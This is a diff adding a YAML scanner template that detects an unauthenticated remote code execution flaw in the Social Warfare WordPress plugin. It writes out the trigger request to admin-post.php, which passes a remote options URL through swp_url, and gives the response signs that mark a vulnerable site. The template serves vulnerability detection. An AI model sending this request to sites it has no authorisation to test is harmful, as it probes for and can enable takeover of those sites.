@@ -1,0 +1,27 @@
+id: wp-social-warfare-rce
+brief:
+    title: Social Warfare <= 3.5.2 - Remote Code Execution
+    by: theamanrawat
+    level: critical
+    about: Unauthenticated remote code execution has been discovered in functionality that handles settings import.
+    label:
+        - wordpress
+        - wpscan
+        - wp-plugin
+        - wp
+        - social-warfare
+        - rce
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-admin/admin-post.php?swp_debug=load_options&swp_url={{path}}'
+      signs:
+        - "on": word
+          has:
+            - No changes made
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 500
